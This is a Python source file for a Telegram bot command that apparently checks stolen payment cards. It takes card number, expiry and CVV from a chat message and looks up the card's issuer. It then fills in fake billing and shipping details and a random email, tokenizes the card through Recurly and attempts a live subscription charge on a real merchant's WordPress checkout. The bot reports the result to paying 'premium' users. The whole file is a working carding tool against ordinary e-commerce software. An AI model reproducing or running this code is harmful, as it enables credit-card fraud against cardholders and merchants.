import requests
import time
import random
import string
import aiohttp
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.enums import ParseMode
from approve_user.approve import is_user_approved  # Import approval check function

# Replace with your actual user ID to limit access to only the bot owner
OWNER_ID = 6492057414

# Asynchronous function to fetch BIN information
async def get_bin_info(bin_number):
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        async with session.get(url) as response:
            if response.status == 200:
                try:
                    bin_info = await response.json()
                    return (
                        bin_info.get("brand", "N/A"),
                        bin_info.get("type", "N/A"),
                        bin_info.get("level", "N/A"),
                        bin_info.get("bank", "N/A"),
                        bin_info.get("country_name", "N/A"),
                        bin_info.get("country_flag", "")
                    )
                except Exception:
                    return "Error parsing BIN info", "N/A", "N/A", "N/A", "N/A", "N/A"
            else:
                return "Error fetching BIN info", "N/A", "N/A", "N/A", "N/A", "N/A"

# Function to generate a random Gmail address
def generate_random_email():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{username}@gmail.com"

@Client.on_message(filters.command(["re", ".re"]))
async def recurly_request(client: Client, message: Message):
    user_id = message.from_user.id

    # Allow only the owner and approved users to use the command
    if user_id != OWNER_ID and not is_user_approved(user_id):
        await message.reply("🚫 You do not have access to this command. Please contact @DeaDxxGod for premium access.")
        return

    start = time.perf_counter()
    try:
        # Extracting card details from the message text
        args = message.text.split()[1]
        number, month, year, cvv = args.split('|')

        # Perform asynchronous BIN lookup for card details
        bin_number = number[:6]
        brand, type_, level, bank, country, flag = await get_bin_info(bin_number)

        # Generate a random Gmail address for the transaction
        email = generate_random_email()

        # Define headers and data for the first request
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://api.recurly.com',
            'priority': 'u=1, i',
            'referer': 'https://api.recurly.com/js/v1/field.html',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        data = {
            'first_name': 'jon',
            'last_name': 'lock',
            'country': 'US',
            'postal_code': '10080',
            'number': number,
            'browser[color_depth]': '24',
            'browser[java_enabled]': 'false',
            'browser[language]': 'en-US',
            'browser[referrer_url']': 'https://misstomrsbox.com/checkout/?choice=3-6&bonus=promo-namechange&plan=mtm-10mo-s',
            'browser[screen_height]': '768',
            'browser[screen_width]': '1366',
            'browser[time_zone_offset]': '-330',
            'browser[user_agent]': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'month': month,
            'year': year,
            'cvv': cvv,
            'version': '4.32.1',
            'key': 'ewr1-UOuCoHJCcOF92pDf26zeQ7',
            'deviceId': 'qXmOYpfjKVciRiij',
            'sessionId': 'fhB2i0ydPIUEtitO',
            'instanceId': 'lhxTV6QqrVsj20BW'
        }

        # First request to get the token ID
        response = requests.post('https://api.recurly.com/js/v1/token', headers=headers, data=data)
        response.raise_for_status()
        token_id = response.json().get('id')

        if not token_id:
            await message.reply("Failed to retrieve token ID.")
            return

        # Second request with token ID
        cookies = {
            '_gcl_au': '1.1.249478371.1730132570',
            '_ga': 'GA1.1.2114782922.1730132571',
            '_fbp': 'fb.1.1730132571667.172312078987297923',
            'lead-magnet-mtm': 't367cookie',
            'sib_cuid': '59854bea-8a11-490e-a6fa-944d3ade6963',
            '_ga_2DE9787T5P': 'GS1.1.1730132571.1.1.1730132754.10.0.0',
        }
        
        params = {
            'action': 'recurly_subs_purchase',
        }

        json_data = {
            'plan': 'mtm-10mo-s',
            'addon': 'us-shipping',
            'bonus': 'promo-mtm15,promo-namechange',
            'pay_source': 'creditcard',
            'currency': 'USD',
            'email': email,
            'shirt': 'L',
            'shoe': 'M 8-9',
            'wed_date': '',
            'wed_year': '',
            'wed_month': '',
            'wed_day': '',
            'first_mom': '',
            'baby_gender': '',
            'ship_fname': 'jon',
            'ship_lname': 'lock',
            'ship_street': '310 main',
            'ship_apt': '',
            'ship_city': 'new york',
            'ship_country': 'US',
            'ship_state': 'NY',
            'ship_zip': '10080',
            'ship_phone': '02065645678',
            'ship_method': 'standard',
            'bill_country': 'US',
            'bill_zip': '10080',
            'code': '',
            'applied_code': 'MTM15OFF',
            'gift': '',
            'personal_msg_checked': False,
            'giftee_email': '',
            'personal_msg': '',
            'market_consent': False,
            'price': '39.98',
            'recurly_token': token_id,
            'purchase_ready': False,
            'first_six': number[:6],
            'action_token_result': '',
            'dev': None,
            'card_brand': 'visa',
        }

        response = requests.post(
            'https://misstomrsbox.com/wp-admin/admin-ajax.php',
            params=params,
            cookies=cookies,
            headers=headers,
            json=json_data,
        )

        # Check response and extract relevant message
        response_data = response.json()
        if response_data.get("success"):
            response_message = "Transaction successful."
        else:
            errors = response_data.get("errors", ["Unknown error occurred."])
            response_message = errors[0] if errors else "Unknown error occurred."

        elapsed_time = time.perf_counter() - start

        # Send formatted response with HTML parse mode from Pyrogram enums
        await message.reply_text(
            f"(↯) 𝗖𝗮𝗿𝗱 ⇾ {number}|{month}|{year}|{cvv}\n"
            f"(↯) 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Recurly Charge\n"
            f"(↯) 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_message}\n\n"
            f"(↯) 𝗜𝗻𝗳𝗼 ⇾ {brand} - {type_} - {level}\n"
            f"(↯) 𝗜𝘀𝘀𝘂𝗲𝗿 ⇾ {bank} 🏛\n"
            f"(↯) 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⇾ {country} {flag}\n\n"
            f"(↯) 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾ {elapsed_time:0.4f} sec\n"
            f"(↯) 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ⇾ <a href=\"tg://user?id={message.from_user.id}\">{message.from_user.first_name}</a>",
            parse_mode=ParseMode.HTML
        )

    except IndexError:
        await message.reply("Invalid format. Use `/re n|mm|yy|cvc` or `.re n|mm|yyyy|cvc`.")
    except requests.exceptions.HTTPError as http_err:
        await message.reply(f"HTTP error occurred: {http_err}")
    except requests.exceptions.RequestException as err:
        await message.reply(f"Request error occurred: {err}")
